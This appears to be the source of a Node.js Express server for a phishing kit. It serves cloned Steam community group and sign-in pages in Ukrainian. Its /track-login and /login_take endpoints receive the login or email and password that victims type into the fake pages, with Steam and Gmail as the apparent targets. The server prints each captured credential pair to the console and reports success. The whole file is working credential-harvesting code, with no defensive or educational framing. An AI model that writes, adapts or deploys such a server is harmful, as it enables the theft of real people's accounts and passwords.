const express = require("express");
const cors = require("cors");
const bodyParser = require("body-parser");
const path = require("path");

const app = express();
const PORT = 10000;

app.use(cors());
app.use(bodyParser.json());
app.use(express.urlencoded({ extended: true }));

app.use("/login", express.static(path.join(__dirname, "login")));
app.use("/group", express.static(path.join(__dirname, "group")));
app.use("/group_logged_in", express.static(path.join(__dirname, "group_logged_in")));

app.post("/track-login", (req, res) => {
    const { login, password } = req.body;

    console.log("Success!");
    console.log("Login:", login);
    console.log("Password:", password);

    res.json({ message: "Дані отримані успішно!" });
});

app.post("/login_take", (req, res) => {
    console.log("GMAIL");
    const { email, password } = req.body;

    console.log("Success!");
    console.log("Email:", email);
    console.log("Password:", password);

    res.json({ message: "Дані отримані успішно!" });
});

app.get("/group/", (req, res) => {
    console.log("GROUP");
    res.sendFile(path.join(__dirname, "group", "Спільнота Steam __ Група __ Один раз не....html"));
});

app.get("/group_logged_in/", (req, res) => {
    console.log("GROUP");
    res.sendFile(path.join(__dirname, "group_logged_in", "Спільнота Steam __ Група __ Один раз не....html"));
});

app.get("/login/", (req, res) => {
    console.log("LOGIN");
    res.sendFile(path.join(__dirname, "login", "Увійти.html"));
});


app.listen(PORT, () => {
    console.log(`Server is running at http://localhost:${PORT}`);
});
